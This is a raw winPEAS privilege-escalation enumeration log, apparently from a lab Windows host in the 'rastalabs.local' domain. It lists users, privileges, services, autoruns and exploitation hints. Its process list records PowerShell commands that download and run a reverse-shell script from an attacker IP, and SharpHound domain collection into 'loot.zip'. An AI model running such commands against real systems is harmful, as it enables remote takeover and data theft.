        |->Password: NotChange-NotExpi-NotReq

    WS06\WDAGUtilityAccount(Disabled): A user account managed and used by the system for Windows Defender Application Guard scenarios.
        |->Password: CanChange-Expi-Req


???????????? Current User Idle Time
   Current User   :     RLAB\tquinn
   Idle Time      :     01h:09m:15s:000ms

???????????? Display Tenant information (DsRegCmd.exe /status)
   Tenant is NOT Azure AD Joined.

???????????? Current Token privileges
? Check if you can escalate privilege using some enabled token https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#token-manipulation                               
    SeShutdownPrivilege: SE_PRIVILEGE_ENABLED
    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeUndockPrivilege: SE_PRIVILEGE_ENABLED
    SeIncreaseWorkingSetPrivilege: SE_PRIVILEGE_ENABLED
    SeTimeZonePrivilege: SE_PRIVILEGE_ENABLED

???????????? Clipboard text

???????????? Logged users
    RLAB\tquinn

???????????? Display information about local users
   Computer Name           :   WS06
   User Name               :   Administrator
   User Id                 :   500
   Is Enabled              :   True
   User Type               :   Administrator
   Comment                 :   Built-in account for administering the computer/domain
   Last Logon              :   13/03/2026 15:57:25
   Logons Count            :   11
   Password Last Set       :   13/03/2026 03:08:09

   =================================================================================================

   Computer Name           :   WS06
   User Name               :   DefaultAccount
   User Id                 :   503
   Is Enabled              :   False
   User Type               :   Guest
   Comment                 :   A user account managed by the system.
   Last Logon              :   01/01/1970 00:00:00
   Logons Count            :   0
   Password Last Set       :   01/01/1970 00:00:00

   =================================================================================================

   Computer Name           :   WS06
   User Name               :   Guest
   User Id                 :   501
   Is Enabled              :   False
   User Type               :   Guest
   Comment                 :   Built-in account for guest access to the computer/domain
   Last Logon              :   01/01/1970 00:00:00
   Logons Count            :   0
   Password Last Set       :   01/01/1970 00:00:00

   =================================================================================================

   Computer Name           :   WS06
   User Name               :   WDAGUtilityAccount
   User Id                 :   504
   Is Enabled              :   False
   User Type               :   Guest
   Comment                 :   A user account managed and used by the system for Windows Defender Application Guard scenarios.
   Last Logon              :   01/01/1970 00:00:00
   Logons Count            :   0
   Password Last Set       :   04/11/2019 11:08:08

   =================================================================================================


???????????? RDP Sessions
    SessID    pSessionName   pUserName      pDomainName              State     SourceIP
    1         Console        tquinn         RLAB                     Active    

???????????? Ever logged users
    WS06\Administrator
    RLAB\Administrator
    RLAB\tquinn
    RLAB\rweston_da

???????????? Home folders found
    C:\Users\Administrator : tquinn [Allow: AllAccess]
    C:\Users\Administrator.WS06 : tquinn [Allow: AllAccess]
    C:\Users\All Users
    C:\Users\Build
    C:\Users\Default
    C:\Users\Default User
    C:\Users\Public : Interactive [Allow: WriteData/CreateFiles]
    C:\Users\rweston_da : tquinn [Allow: AllAccess]
    C:\Users\tquinn : tquinn [Allow: AllAccess]

???????????? Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultDomainName             :  rastalabs.local
    DefaultUserName               :  tquinn

???????????? Password Policies
? Check for a possible brute-force 
    Domain: Builtin
    SID: S-1-5-32
    MaxPasswordAge: 42.22:47:31.7437440
    MinPasswordAge: 00:00:00
    MinPasswordLength: 0
    PasswordHistoryLength: 0
    PasswordProperties: 0
   =================================================================================================

    Domain: WS06
    SID: S-1-5-21-2494600839-2512263147-1827803950
    MaxPasswordAge: 42.00:00:00
    MinPasswordAge: 1.00:00:00
    MinPasswordLength: 7
    PasswordHistoryLength: 24
    PasswordProperties: DOMAIN_PASSWORD_COMPLEX
   =================================================================================================


???????????? Print Logon Sessions
    Method:                       WMI
    Logon Server:                 
    Logon Server Dns Domain:      
    Logon Id:                     224538
    Logon Time:                   
    Logon Type:                   Interactive
    Start Time:                   13/03/2026 17:09:30
    Domain:                       RLAB
    Authentication Package:       Kerberos
    Start Time:                   13/03/2026 17:09:30
    User Name:                    tquinn
    User Principal Name:          
    User SID:                     

   =================================================================================================



????????????????????????????????????? Processes Information ?????????????????????????????????????

???????????? Interesting Processes -non Microsoft-
? Check if any interesting processes for memory dump or if you could overwrite some binary running https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#running-processes                                                                                                    
    svchost(4132)[C:\WINDOWS\system32\svchost.exe] -- POwn: tquinn
    Command Line: C:\WINDOWS\system32\svchost.exe -k UnistackSvcGroup -s CDPUserSvc
   =================================================================================================

    conhost(3732)[C:\WINDOWS\system32\conhost.exe] -- POwn: tquinn
    Command Line: \??\C:\WINDOWS\system32\conhost.exe 0x4
   =================================================================================================

    conhost(3480)[C:\WINDOWS\system32\conhost.exe] -- POwn: tquinn
    Command Line: \??\C:\WINDOWS\system32\conhost.exe 0x4
   =================================================================================================

    SystemSettings(6960)[C:\Windows\ImmersiveControlPanel\SystemSettings.exe] -- POwn: tquinn
    Command Line: "C:\Windows\ImmersiveControlPanel\SystemSettings.exe" -ServerName:microsoft.windows.immersivecontrolpanel                                                                                     
   =================================================================================================    

    ShellExperienceHost(6616)[C:\WINDOWS\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe] -- POwn: tquinn                                                                                  
    Command Line: "C:\WINDOWS\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe" -ServerName:App.AppXtk181tbxbce2qsex02s8tw7hfxa9xb3t.mca                                                    
   =================================================================================================    

    Phisherman(3620)[C:\ProgramData\Phisherman\Phisherman.exe] -- POwn: tquinn -- isDotNet
    Command Line: "C:\ProgramData\Phisherman\Phisherman.exe" 
   =================================================================================================    

    RuntimeBroker(6524)[C:\Windows\System32\RuntimeBroker.exe] -- POwn: tquinn
    Command Line: C:\Windows\System32\RuntimeBroker.exe -Embedding
   =================================================================================================

    cmd(6172)[C:\WINDOWS\SysWOW64\cmd.exe] -- POwn: tquinn
    Command Line: cmd.exe 
   =================================================================================================    

    cmd(5232)[C:\WINDOWS\SysWOW64\cmd.exe] -- POwn: tquinn
    Command Line: "C:\WINDOWS\system32\cmd.exe"
   =================================================================================================    

    winpeas(5516)[C:\Users\tquinn\winpeas.exe] -- POwn: tquinn -- isDotNet
    Permissions: tquinn [Allow: AllAccess]
    Possible DLL Hijacking folder: C:\Users\tquinn (tquinn [Allow: AllAccess])
    Command Line: "C:\Users\tquinn\winpeas.exe"
   =================================================================================================    

    powershell(5064)[C:\WINDOWS\SysWOW64\WindowsPowerShell\v1.0\powershell.exe] -- POwn: tquinn
    Command Line: powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.2:443/rev.ps1')                                                                                                  
   =================================================================================================    

    conhost(1908)[C:\WINDOWS\system32\conhost.exe] -- POwn: tquinn
    Command Line: \??\C:\WINDOWS\system32\conhost.exe 0x4
   =================================================================================================

    cmd(6464)[C:\WINDOWS\SysWOW64\cmd.exe] -- POwn: tquinn
    Command Line: C:\WINDOWS\system32\cmd.exe 
   =================================================================================================    

    vmtoolsd(3808)[C:\Program Files\VMware\VMware Tools\vmtoolsd.exe] -- POwn: tquinn
    Command Line: "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
   =================================================================================================    

    powershell(2528)[C:\WINDOWS\SysWOW64\WindowsPowerShell\v1.0\powershell.exe] -- POwn: tquinn
    Command Line: powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.2:8080/rev.ps1')                                                                                                 
   =================================================================================================    

    taskhostw(4248)[C:\WINDOWS\system32\taskhostw.exe] -- POwn: tquinn
    Command Line: taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E}
   =================================================================================================    

    SecurityHealthSystray(6024)[C:\Windows\System32\SecurityHealthSystray.exe] -- POwn: tquinn
    Command Line: "C:\Windows\System32\SecurityHealthSystray.exe" 
   =================================================================================================    

    ApplicationFrameHost(6972)[C:\WINDOWS\system32\ApplicationFrameHost.exe] -- POwn: tquinn
    Command Line: C:\WINDOWS\system32\ApplicationFrameHost.exe -Embedding
   =================================================================================================

    RuntimeBroker(6212)[C:\Windows\System32\RuntimeBroker.exe] -- POwn: tquinn
    Command Line: C:\Windows\System32\RuntimeBroker.exe -Embedding
   =================================================================================================

    conhost(3852)[C:\WINDOWS\system32\conhost.exe] -- POwn: tquinn
    Command Line: \??\C:\WINDOWS\system32\conhost.exe 0x4
   =================================================================================================

    conhost(3248)[C:\WINDOWS\system32\conhost.exe] -- POwn: tquinn
    Command Line: \??\C:\WINDOWS\system32\conhost.exe 0x4
   =================================================================================================

    updata(1920)[C:\Users\tquinn\AppData\Local\Microsoft\Windows\INetCache\IE\IRV36146\updata.exe] -- POwn: tquinn
    Permissions: tquinn [Allow: AllAccess]
    Possible DLL Hijacking folder: C:\Users\tquinn\AppData\Local\Microsoft\Windows\INetCache\IE\IRV36146 (tquinn [Allow: AllAccess])                                                                            
    Command Line: "C:\Users\tquinn\AppData\Local\Microsoft\Windows\INetCache\IE\IRV36146\updata.exe" 
   =================================================================================================    

    cmd(2640)[C:\WINDOWS\SysWOW64\cmd.exe] -- POwn: tquinn
    Command Line: C:\WINDOWS\system32\cmd.exe 
   =================================================================================================    

    SearchApp(6348)[C:\WINDOWS\SystemApps\Microsoft.Windows.Search_cw5n1h2txyewy\SearchApp.exe] -- POwn: tquinn                                                                                                 
    Command Line: "C:\WINDOWS\SystemApps\Microsoft.Windows.Search_cw5n1h2txyewy\SearchApp.exe" -ServerName:CortanaUI.AppX8z9r6jm96hw4bsbneegw0kyxx296wr9t.mca                                                   
   =================================================================================================    

    conhost(4600)[C:\WINDOWS\system32\conhost.exe] -- POwn: tquinn
    Command Line: \??\C:\WINDOWS\system32\conhost.exe 0x4
   =================================================================================================

    SharpHound(4164)[C:\Windows\Temp\SharpHound.exe] -- POwn: tquinn
    Permissions: tquinn [Allow: AllAccess]
    Command Line: "C:\Windows\Temp\SharpHound.exe" -c All --zipfilename loot.zip
   =================================================================================================    

    SharpHound(4992)[C:\Users\tquinn\SharpHound.exe] -- POwn: tquinn
    Permissions: tquinn [Allow: AllAccess]
    Possible DLL Hijacking folder: C:\Users\tquinn (tquinn [Allow: AllAccess])
    Command Line: "C:\Users\tquinn\SharpHound.exe" -c All --zipfilename loot.zip
   =================================================================================================    

    svchost(4688)[C:\WINDOWS\system32\svchost.exe] -- POwn: tquinn
    Command Line: C:\WINDOWS\system32\svchost.exe -k UnistackSvcGroup
   =================================================================================================

    mobsync(6756)[C:\WINDOWS\System32\mobsync.exe] -- POwn: tquinn
    Command Line: C:\WINDOWS\System32\mobsync.exe -Embedding
   =================================================================================================

    sihost(3404)[C:\WINDOWS\system32\sihost.exe] -- POwn: tquinn
    Command Line: sihost.exe
   =================================================================================================    

    explorer(5368)[C:\WINDOWS\Explorer.EXE] -- POwn: tquinn
    Command Line: C:\WINDOWS\Explorer.EXE
   =================================================================================================    

    svchost(5644)[C:\WINDOWS\system32\svchost.exe] -- POwn: tquinn
    Command Line: C:\WINDOWS\system32\svchost.exe -k ClipboardSvcGroup -p -s cbdhsvc
   =================================================================================================

    powershell(816)[C:\WINDOWS\SysWOW64\WindowsPowerShell\v1.0\powershell.exe] -- POwn: tquinn
    Command Line: powershell.exe 
   =================================================================================================    

    svchost(4156)[C:\WINDOWS\system32\svchost.exe] -- POwn: tquinn
    Command Line: C:\WINDOWS\system32\svchost.exe -k UnistackSvcGroup -s WpnUserService
   =================================================================================================

    RuntimeBroker(6904)[C:\Windows\System32\RuntimeBroker.exe] -- POwn: tquinn
    Command Line: C:\Windows\System32\RuntimeBroker.exe -Embedding
   =================================================================================================

    UserOOBEBroker(6512)[C:\Windows\System32\oobe\UserOOBEBroker.exe] -- POwn: tquinn
    Command Line: C:\Windows\System32\oobe\UserOOBEBroker.exe -Embedding
   =================================================================================================

    RuntimeBroker(1976)[C:\Windows\System32\RuntimeBroker.exe] -- POwn: tquinn
    Command Line: C:\Windows\System32\RuntimeBroker.exe -Embedding
   =================================================================================================

    StartMenuExperienceHost(2012)[C:\Windows\SystemApps\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\StartMenuExperienceHost.exe] -- POwn: tquinn                                                    
    Command Line: "C:\Windows\SystemApps\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\StartMenuExperienceHost.exe" -ServerName:App.AppXywbrabmsek0gm3tkwpr5kwzbs55tkqay.mca                          
   =================================================================================================    


???????????? Vulnerable Leaked Handlers
?  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#leaked-handlers                                                                                              
? Getting Leaked Handlers, it might take some time...
    Handle: 672(process)
    Handle Owner: Pid is 1920(updata) with owner: tquinn
    Reason: PROCESS_ALL_ACCESS
    Handle PID: 2980(Error, process may not exist)
   =================================================================================================

    Handle: 1484(process)
    Handle Owner: Pid is 4992(SharpHound) with owner: tquinn
    Reason: PROCESS_ALL_ACCESS
    Handle PID: 5144(Error, process may not exist)
   =================================================================================================

    Handle: 2472(key)
    Handle Owner: Pid is 5516(winpeas) with owner: tquinn
    Reason: TakeOwnership
    Registry: HKLM\system\controlset001\control\nls\sorting\ids
   =================================================================================================

    Handle: 2580(file)
    Handle Owner: Pid is 5516(winpeas) with owner: tquinn
    Reason: TakeOwnership
    File Path: \Windows\System32\en-US\wscui.cpl.mui
    File Owner: NT SERVICE\TrustedInstaller
   =================================================================================================

    Handle: 2820(key)
    Handle Owner: Pid is 5516(winpeas) with owner: tquinn
    Reason: AllAccess
    Registry: HKLM\software\microsoft\windows nt\currentversion\image file execution options
   =================================================================================================



????????????????????????????????????? Services Information ?????????????????????????????????????

???????????? Interesting Services -non Microsoft-
? Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#services                                                                                                     
    ssh-agent(OpenSSH Authentication Agent)[C:\WINDOWS\System32\OpenSSH\ssh-agent.exe] - Disabled - Stopped
    Agent to hold private keys used for public key authentication.
   =================================================================================================    

    VGAuthService(VMware, Inc. - VMware Alias Manager and Ticket Service)["C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"] - Auto - Running                                              
    Alias Manager and Ticket Service
   =================================================================================================    

    vm3dservice(VMware, Inc. - VMware SVGA Helper Service)[C:\WINDOWS\system32\vm3dservice.exe] - Auto - Running
    Helps VMware SVGA driver by collecting and conveying user mode information
   =================================================================================================    

    VMTools(VMware, Inc. - VMware Tools)["C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"] - Auto - Running
    Provides support for synchronizing objects between the host and guest operating systems.
   =================================================================================================    


???????????? Modifiable Services
? Check if you can modify any service https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#services                                                                  
    LOOKS LIKE YOU CAN MODIFY OR START/STOP SOME SERVICE/s:
    RmSvc: GenericExecute (Start/Stop)
    wcncsvc: GenericExecute (Start/Stop)
    BcastDVRUserService_407a1: GenericExecute (Start/Stop)
    ConsentUxUserSvc_407a1: GenericExecute (Start/Stop)
    CredentialEnrollmentManagerUserSvc_407a1: GenericExecute (Start/Stop)
    DeviceAssociationBrokerSvc_407a1: GenericExecute (Start/Stop)
    DevicePickerUserSvc_407a1: GenericExecute (Start/Stop)
    DevicesFlowUserSvc_407a1: GenericExecute (Start/Stop)
    PimIndexMaintenanceSvc_407a1: GenericExecute (Start/Stop)
    PrintWorkflowUserSvc_407a1: GenericExecute (Start/Stop)
    UdkUserSvc_407a1: GenericExecute (Start/Stop)
    UnistoreSvc_407a1: GenericExecute (Start/Stop)
    UserDataSvc_407a1: GenericExecute (Start/Stop)
    WpnUserService_407a1: GenericExecute (Start/Stop)

???????????? Looking if you can modify any service registry
? Check if you can modify the registry of a service https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#services-registry-modify-permissions                        
    [-] Looks like you cannot change the registry of any service...

???????????? Checking write permissions in PATH folders (DLL Hijacking)
? Check for DLL Hijacking in PATH folders https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#dll-hijacking                                                         
    C:\WINDOWS\system32
    C:\WINDOWS
    C:\WINDOWS\System32\Wbem
    C:\WINDOWS\System32\WindowsPowerShell\v1.0\
    C:\WINDOWS\System32\OpenSSH\


????????????????????????????????????? Applications Information ?????????????????????????????????????

???????????? Current Active Window Application
    C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe

???????????? Installed Applications --Via Program Files/Uninstall registry--
? Check if you can modify installed software https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#applications                                                       
    C:\Program Files\Common Files
    C:\Program Files\CUAssistant
    C:\Program Files\desktop.ini
    C:\Program Files\Internet Explorer
    C:\Program Files\LAPS
    C:\Program Files\Microsoft Update Health Tools
    C:\Program Files\ModifiableWindowsApps
    C:\Program Files\PackageManagement
    C:\Program Files\rempl
    C:\Program Files\ruxim
    C:\Program Files\Uninstall Information
    C:\Program Files\UNP
    C:\Program Files\VMware
    C:\Program Files\Windows Defender
    C:\Program Files\Windows Defender Advanced Threat Protection
    C:\Program Files\Windows Mail
    C:\Program Files\Windows Media Player
    C:\Program Files\Windows Multimedia Platform
    C:\Program Files\Windows NT
    C:\Program Files\Windows Photo Viewer
    C:\Program Files\Windows Portable Devices
    C:\Program Files\Windows Security
    C:\Program Files\Windows Sidebar
    C:\Program Files\WindowsApps
    C:\Program Files\WindowsPowerShell


???????????? Autorun Applications
? Check if you can modify other users AutoRuns binaries (Note that is normal that you can modify HKCU registry and binaries indicated there) https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.html                                       

    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Run
    Key: SecurityHealth
    Folder: C:\WINDOWS\system32
    File: C:\WINDOWS\system32\SecurityHealthSystray.exe
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Run
    Key: Phisherman
    Folder: C:\ProgramData\Phisherman
    File: C:\ProgramData\Phisherman\Phisherman.exe
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Run
    Key: VMware User Process
    Folder: C:\Program Files\VMware\VMware Tools
    File: C:\Program Files\VMware\VMware Tools\vmtoolsd.exe -n vmusr (Unquoted and Space detected) - C:\
   =================================================================================================


    RegPath: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
    RegPerms: tquinn [Allow: FullControl]
    Key: Synaptics Pointing Device Driver
    Folder: C:\ProgramData\Synaptics
    FolderPerms: tquinn [Allow: AllAccess], Users [Allow: WriteData/CreateFiles]
    File: C:\ProgramData\Synaptics\Synaptics.exe
    FilePerms: tquinn [Allow: AllAccess]
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
    Key: Common Startup
    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
    Key: Common Startup
    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
    Key: Userinit
    Folder: C:\Windows\system32
    File: C:\Windows\system32\userinit.exe,
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
    Key: Shell
    Folder: None (PATH Injection)
    File: explorer.exe
   =================================================================================================


    RegPath: HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot
    Key: AlternateShell
    Folder: None (PATH Injection)
    File: cmd.exe
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Font Drivers
    Key: Adobe Type Manager
    Folder: None (PATH Injection)
    File: atmfd.dll
   =================================================================================================


    RegPath: HKLM\Software\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers
    Key: Adobe Type Manager
    Folder: None (PATH Injection)
    File: atmfd.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: aux
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: midi
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: midimapper
    Folder: None (PATH Injection)
    File: midimap.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: mixer
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.imaadpcm
    Folder: None (PATH Injection)
    File: imaadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msadpcm
    Folder: None (PATH Injection)
    File: msadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msg711
    Folder: None (PATH Injection)
    File: msg711.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msgsm610
    Folder: None (PATH Injection)
    File: msgsm32.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.i420
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.iyuv
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.mrle
    Folder: None (PATH Injection)
    File: msrle32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.msvc
    Folder: None (PATH Injection)
    File: msvidc32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.uyvy
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yuy2
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvu9
    Folder: None (PATH Injection)
    File: tsbyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvyu
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: wave
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: wavemapper
    Folder: None (PATH Injection)
    File: msacm32.drv
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.l3acm
    Folder: C:\Windows\System32
    File: C:\Windows\System32\l3codeca.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: aux
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: midi
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: midimapper
    Folder: None (PATH Injection)
    File: midimap.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: mixer
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.imaadpcm
    Folder: None (PATH Injection)
    File: imaadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msadpcm
    Folder: None (PATH Injection)
    File: msadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msg711
    Folder: None (PATH Injection)
    File: msg711.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msgsm610
    Folder: None (PATH Injection)
    File: msgsm32.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.cvid
    Folder: None (PATH Injection)
    File: iccvid.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.i420
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.iyuv
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.mrle
    Folder: None (PATH Injection)
    File: msrle32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.msvc
    Folder: None (PATH Injection)
    File: msvidc32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.uyvy
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yuy2
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvu9
    Folder: None (PATH Injection)
    File: tsbyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvyu
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: wave
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: wavemapper
    Folder: None (PATH Injection)
    File: msacm32.drv
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.l3acm
    Folder: C:\Windows\SysWOW64
    File: C:\Windows\SysWOW64\l3codeca.acm
   =================================================================================================


    RegPath: HKLM\Software\Classes\htmlfile\shell\open\command
    Folder: C:\Program Files\Internet Explorer
    File: C:\Program Files\Internet Explorer\IEXPLORE.EXE %1 (Unquoted and Space detected) - C:\
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _wow64cpu
    Folder: None (PATH Injection)
    File: wow64cpu.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _wowarmhw
    Folder: None (PATH Injection)
    File: wowarmhw.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _xtajit
    Folder: None (PATH Injection)
    File: xtajit.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: advapi32
    Folder: None (PATH Injection)
    File: advapi32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: clbcatq
    Folder: None (PATH Injection)
    File: clbcatq.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: combase
    Folder: None (PATH Injection)
    File: combase.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: COMDLG32
    Folder: None (PATH Injection)
    File: COMDLG32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: coml2
    Folder: None (PATH Injection)
    File: coml2.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: DifxApi
    Folder: None (PATH Injection)
    File: difxapi.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: gdi32
    Folder: None (PATH Injection)
    File: gdi32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: gdiplus
    Folder: None (PATH Injection)
    File: gdiplus.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: IMAGEHLP
    Folder: None (PATH Injection)
    File: IMAGEHLP.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: IMM32
    Folder: None (PATH Injection)
    File: IMM32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: kernel32
    Folder: None (PATH Injection)
    File: kernel32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: MSCTF
    Folder: None (PATH Injection)
    File: MSCTF.dll
   =================================================================================================


